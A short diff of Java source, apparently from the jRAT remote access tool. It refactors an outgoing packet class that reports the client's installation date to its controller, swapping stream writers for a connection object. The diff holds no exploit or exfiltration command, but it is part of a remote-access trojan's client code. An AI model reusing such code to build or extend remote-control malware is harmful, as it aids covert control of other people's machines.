@@ -1,21 +1,20 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
 import jrat.client.Configuration;
-import java.io.DataOutputStream;
+import jrat.client.Connection;
 
 
 public class Packet11InitInstallationDate extends AbstractOutgoingPacket {
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+	public void write(Connection con) throws Exception {
 		String date = Configuration.getInstallationDate();
 		
 		if (date == null) {
 			date = "Unknown";
 		}
-		
-		sw.writeLine(date);
+
+        con.writeLine(date);
 	}
 
 	@Override
